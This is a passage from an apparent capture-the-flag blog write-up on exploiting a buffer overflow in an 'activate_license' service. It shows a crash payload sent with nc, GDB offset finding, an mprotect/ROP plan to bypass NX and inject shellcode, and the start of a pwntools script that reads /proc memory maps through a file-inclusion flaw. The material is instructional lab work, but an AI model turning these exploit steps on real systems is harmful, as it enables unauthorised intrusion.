+</span></span><span style="display:flex;"><span>7f4b23d71000-7f4b23d79000 r--p <span style="color:#ae81ff">00021000</span> 08:01 <span style="color:#ae81ff">3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23d7a000-7f4b23d7b000 r--p <span style="color:#ae81ff">00029000</span> 08:01 <span style="color:#ae81ff">3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23d7b000-7f4b23d7c000 rw-p 0002a000 08:01 <span style="color:#ae81ff">3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23d7c000-7f4b23d7d000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>7fffc0546000-7fffc0567000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>7fffc056e000-7fffc0572000 r--p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>7fffc0572000-7fffc0574000 r-xp <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+</span></span></code></pre></div><blockquote>
+<p>I protected my process against overflow attack&hellip; yeahh but i have the memory addtess layout :)</p>
+</blockquote>
+<h5 id="gdb-with-gef-extension">GDB (With GEF extension):</h5>
+<ul>
+<li>Prepare the file size:
+<ul>
+<li>The file size need to be converted into network byte order:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># convert the file size (600) into hexadecimal value</span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#34;obase=16; 600&#34;</span> | bc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">258</span>
+</span></span></code></pre></div><ul>
+<li>Host byte order: (600) base 10 = (258) base 16 = <code>(\x00\x00\x02\x58)</code> base 16 (hexadecimal)</li>
+<li>Convert to network byte order: <code>\x00\x00\x02\x58</code> &ndash;&gt; <code>\x58\x02\x00\x00</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// C program to convert from Host byte order to Network byte order enjoy ;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// cat convertOSbyteOrderToNetwork.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span> (){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Define the value to convert
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> value <span style="color:#f92672">=</span> <span style="color:#ae81ff">600</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Convert the value to network byte order
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// !!!Important: socket_write($socket, pack(&#34;N&#34;, $license_size)); the file size is packed into
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// uint32 byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// network byte order.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> network_value <span style="color:#f92672">=</span> htonl(value);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x%02x</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x%02x</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x%02x</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x%02x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (network_value <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>, (network_value <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>, (network_value <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>, network_value <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ ./convertOSbyteOrderToNetwork
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span></code></pre></div><h6 id="crash-the-program--0-">Crash the program: ( :0 )</h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Run the program localy at port 443</span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ ./activate_license <span style="color:#ae81ff">4443</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> starting server listening on port <span style="color:#ae81ff">4443</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> listening ...
+</span></span></code></pre></div><ul>
+<li>The program expect from us first:
+<ul>
+<li><code>msglen</code> 4 bytes: respresents the file size.</li>
+<li><code>msglen</code> - bytes of data to read into the <code>buffer</code> variable.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Send the payload (4 + 600)bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># First 4 bytes represents the file size in network byte order</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Syntax: echo -e &#34;networkByteOrder(600)$_gef0&#34; | nc 127.0.0.1 444</span>
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;\x58\x02\x00\x00aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac&#34;</span> | nc 127.0.0.1 <span style="color:#ae81ff">4443</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start gdb</span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ sudo gdb -q -p <span style="color:#66d9ef">$(</span>pidof activate_license<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gef➤  set follow-fork-mode child
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gef➤  pattern create <span style="color:#ae81ff">600</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generating a pattern of <span style="color:#ae81ff">600</span> bytes <span style="color:#f92672">(</span>n<span style="color:#f92672">=</span>8<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved as <span style="color:#e6db74">&#39;$_gef0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gef➤  c
+</span></span><span style="display:flex;"><span>Continuing.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Attaching after Thread 0x7f1af4be80c0 <span style="color:#f92672">(</span>LWP 570<span style="color:#f92672">)</span> fork to child process 583<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>New inferior <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>process 583<span style="color:#f92672">)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Detaching after fork from parent process 570<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Inferior <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>process 570<span style="color:#f92672">)</span> detached<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Thread 2.1 <span style="color:#e6db74">&#34;activate_licens&#34;</span> received signal SIGSEGV, Segmentation fault.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Switching to Thread 0x7f1af4be80c0 <span style="color:#f92672">(</span>LWP 583<span style="color:#f92672">)]</span>
+</span></span><span style="display:flex;"><span>0x0000561ab03485c0 in activate_license <span style="color:#f92672">(</span>sockfd<span style="color:#f92672">=</span>0x4<span style="color:#f92672">)</span> at activate_license.c:64
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span>      activate_license.c: No such file or directory.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> Legend: Modified register | Code | Heap | Stack | String <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+</span></span><span style="display:flex;"><span>$rax   : 0x276
+</span></span><span style="display:flex;"><span>$rbx   : 0x00561ab03487c0  →  &lt;__libc_csu_init+0&gt; push r15
+</span></span><span style="display:flex;"><span>$rcx   : 0x0
+</span></span><span style="display:flex;"><span>$rdx   : 0x007f1af4be80c0  →  0x007f1af4be80c0  →  <span style="color:#f92672">[</span>loop detected<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>$rsp   : 0x007ffcaa661918  →  <span style="color:#e6db74">&#34;paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]&#34;</span> <span style="color:#75715e"># you crashed me</span>
+</span></span><span style="display:flex;"><span>$rbp   : 0x636161616161616f <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;oaaaaaac&#34;</span>?<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$rsi   : 0x0
+</span></span><span style="display:flex;"><span>$rdi   : 0x007ffcaa661180  →  0x007f1af4dc4090  →  &lt;funlockfile+0&gt; endbr64
+</span></span><span style="display:flex;"><span>$rip   : 0x00561ab03485c0  →  &lt;activate_license+643&gt; ret
+</span></span><span style="display:flex;"><span>$r8    : 0x0
+</span></span><span style="display:flex;"><span>$r9    : 0x276
+</span></span><span style="display:flex;"><span>$r10   : 0x00561ab03490e6  →  0x666963657073000a <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>?<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$r11   : 0x246
+</span></span><span style="display:flex;"><span>$r12   : 0x00561ab0348220  →  &lt;_start+0&gt; xor ebp, ebp
+</span></span><span style="display:flex;"><span>$r13   : 0x007ffcaa661a70  →  0x0000000000000002
+</span></span><span style="display:flex;"><span>$r14   : 0x0
+</span></span><span style="display:flex;"><span>$r15   : 0x0
+</span></span><span style="display:flex;"><span>$eflags: <span style="color:#f92672">[</span>zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
+</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+</span></span><span style="display:flex;"><span>0x007ffcaa661918│+0x0000: <span style="color:#e6db74">&#34;paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]&#34;</span>      ← $rsp
+</span></span><span style="display:flex;"><span>0x007ffcaa661920│+0x0008: <span style="color:#e6db74">&#34;qaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwa[...]&#34;</span>
+</span></span><span style="display:flex;"><span>0x007ffcaa661928│+0x0010: <span style="color:#e6db74">&#34;raaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxa[...]&#34;</span>
+</span></span><span style="display:flex;"><span>0x007ffcaa661930│+0x0018: <span style="color:#e6db74">&#34;saaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacya[...]&#34;</span>
+</span></span><span style="display:flex;"><span>0x007ffcaa661938│+0x0020: <span style="color:#e6db74">&#34;taaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac\n[...]&#34;</span>
+</span></span><span style="display:flex;"><span>0x007ffcaa661940│+0x0028: 0x6361616161616175
+</span></span><span style="display:flex;"><span>0x007ffcaa661948│+0x0030: 0x6361616161616176
+</span></span><span style="display:flex;"><span>0x007ffcaa661950│+0x0038: 0x6361616161616177
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+</span></span><span style="display:flex;"><span>   0x561ab03485b9 &lt;activate_license+636&gt; call   0x561ab03480b0 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x561ab03485be &lt;activate_license+641&gt; nop
+</span></span><span style="display:flex;"><span>   0x561ab03485bf &lt;activate_license+642&gt; leave
+</span></span><span style="display:flex;"><span> → 0x561ab03485c0 &lt;activate_license+643&gt; ret
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot disassemble from $PC
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#0] Id 1, Name: &#34;activate_licens&#34;, stopped 0x561ab03485c0 in activate_license (), reason: SIGSEGV</span>
+</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#0] 0x561ab03485c0 → activate_license(sockfd=0x4)</span>
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><ul>
+<li>$rsp = &ldquo;paaaaaac &hellip;&hellip;&rdquo;: Stack pointer</li>
+<li>Get the offset value:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  pattern search paaaaaac
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;paaaaaac&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found at offset <span style="color:#ae81ff">520</span> <span style="color:#f92672">(</span>big-endian search<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li><strong>Full payload size: offset:</strong> 520 + 4 (the length <code>msglen</code>)</li>
+</ul>
+<h5 id="binary-exploitation-prepare-the-exploitations-python-code">Binary Exploitation: Prepare the exploitation&rsquo;s python code</h5>
+<ul>
+<li>Small Steps Recap:
+<ul>
+<li>We have the memory layout from the <code>/proc/&lt;pid&gt;/maps</code> file. (ASLR bye bye)</li>
+<li>NX enabled: use return to libc technics to enable the stack execution (it&rsquo;s disabled due to NX - No execute protection)</li>
+<li>Final Step: inject our shellcode and gaining access to the machine (pwned).</li>
+</ul>
+</li>
+</ul>
+<h6 id="disable-nx">Disable NX:</h6>
+<ul>
+<li>We will use the: <code>mprotect</code> function to set the memory protection and enable stack execution bit, so disabling the NX protection.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># mprotect manual page</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># man 2 mprotect</span>
+</span></span><span style="display:flex;"><span>MPROTECT<span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                          Linux Programmer<span style="color:#e6db74">&#39;s Manual                                         MPROTECT(2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NAME
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       mprotect, pkey_mprotect - set protection on a region of memory
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SYNOPSIS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       #include &lt;sys/mman.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       int mprotect(void *addr, size_t len, int prot);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       #define _GNU_SOURCE             /* See feature_test_macros(7) */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       #include &lt;sys/mman.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       int pkey_mprotect(void *addr, size_t len, int prot, int pkey);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">DESCRIPTION
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       mprotect()  changes  the access protections for the calling process&#39;</span>s memory pages containing any part of the address range
+</span></span><span style="display:flex;"><span>       in the interval <span style="color:#f92672">[</span>addr, addr+len-1<span style="color:#f92672">]</span>.  addr must be aligned to a page boundary.
+</span></span></code></pre></div><h6 id="prepare-our-gadets">Prepare our gadets:</h6>
+<blockquote>
+<p>A ROP chain, short for &ldquo;return-oriented programming chain&rdquo;, is a sequence of gadget instructions that are strung together to form a malicious program. A gadget is a short sequence of instructions that ends with a return instruction, and is often found in compiled code. By chaining gadgets together, an attacker can construct a program that executes arbitrary code, even in environments where traditional forms of injection (such as buffer overflows) are prevented. This technique is often used in attacks that exploit vulnerabilities in software. (ChatGPT)</p>
+</blockquote>
+<blockquote>
+<p>ROP chain: build your own program inside another program, using assembly instructions (gadgets)<br>
+(Hassan Al Achek :p)</p>
+</blockquote>
+<ul>
+<li>You can use <code>ropper</code> to get <code>mprotect</code> gadget.</li>
+<li>Or use <code>pwntools</code> a python library for binary exploitaion (i will use pwntools)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Note: a friend helped me to build this code</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>re<span style="color:#f92672">,</span>requests<span style="color:#f92672">,</span>socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IP<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.11.154&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">usage</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Usage: </span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> &lt;LOCAL IP&gt; &lt;LOCAL PORT&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># download file and save to /tmp</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file</span>(path):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?page=</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    localPath <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/tmp/</span><span style="color:#e6db74">{</span>path<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(localPath,<span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(r<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> localPath
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># find process id</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_pid</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?page=/proc/sched_debug&#34;</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    pid <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;activate_licens\s+([0-9]+)&#34;</span>,r<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] activate_license running @ PID </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extract base addresses from /proc/PID/maps</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_addresses</span>(pid):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?page=/proc/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/maps&#34;</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^.*libc.*$&#34;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>M)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    libc_path <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^.*libc.*$&#34;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>M)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    libsqlite_base <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^.*libsqlite.*$&#34;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>M)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    libsqlite_path <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^.*libsqlite.*$&#34;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>M)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    stack_base <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^.*\[stack\].*$&#34;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>M)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
